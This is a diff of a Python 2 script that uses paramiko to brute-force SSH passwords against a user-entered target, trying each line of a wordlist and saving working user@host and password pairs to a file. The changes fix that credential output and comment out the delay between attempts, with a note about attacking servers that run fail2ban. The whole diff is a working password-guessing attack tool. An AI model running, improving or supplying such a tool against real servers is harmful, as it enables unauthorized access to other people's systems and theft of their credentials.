@@ -6,6 +6,7 @@ from time import sleep
 ssh = paramiko.SSHClient()                  
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
+call("clear")
 # Get information from user
 target = raw_input("Enter Target:\n>>> ")
 c = call("clear")
@@ -21,15 +22,15 @@ for each_line in f:
         ssh.connect(target, username= usr, password= each_line.rstrip())
         ssh.close()
         w = open('passwd.lst','w')
-        w.write('%s %s  %s' % (target, usr, passwd))
+        w.write('%s@%s  %s' % ( usr, target, each_line))
         print ':)'
     except paramiko.ssh_exception.AuthenticationException:
             print "Failed"
     except paramiko.ssh_exception.SSHException:
-            print "fail"
+            print "Failed"
     finally:
         ssh.close()
-        sleep(10)
+        #sleep(5)                              # delay if attacking ssh with fail2ban
         call("clear")
     
 exit(0)
